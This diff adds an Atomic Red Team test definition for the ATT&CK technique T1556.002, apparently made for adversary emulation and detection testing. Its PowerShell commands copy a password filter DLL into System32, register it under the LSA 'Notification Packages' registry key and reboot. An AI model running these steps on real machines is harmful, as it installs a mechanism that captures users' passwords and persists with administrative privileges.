@@ -1,0 +1,33 @@
+attack_technique:
+- T1556.002
+display_name: Password Filter DLL
+atomic_tests:
+- name: Install and Register Password Filter DLL
+  description: |
+    Uses PowerShell to install and register a password filter DLL. Requires a reboot and administrative privileges.
+  supported_platforms:
+  - windows
+  input_arguments:
+    input_dll:
+      description: Path to DLL to be installed and registered
+      type: Path
+      default: PathToAtomicsFolder\T1174\src\AtomicPasswordFilter.dll
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      AtomicPasswordFilter.dll must exist on disk at specified location (#{input_dll})
+    prereq_command: |
+      if (Test-Path #{input_dll}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Write-Host "You must provide your own password filter dll"
+  executor:
+    command: |
+      $passwordFilterName = (Copy-Item "#{input_dll}" -Destination "C:\Windows\System32" -PassThru).basename
+      $lsaKey = Get-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
+      $notificationPackagesValues = $lsaKey.GetValue("Notification Packages")
+      $notificationPackagesValues += $passwordFilterName
+      Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" "Notification Packages" $notificationPackagesValues
+      Restart-Computer -Confirm
+    name: powershell
+    elevation_required: true
+
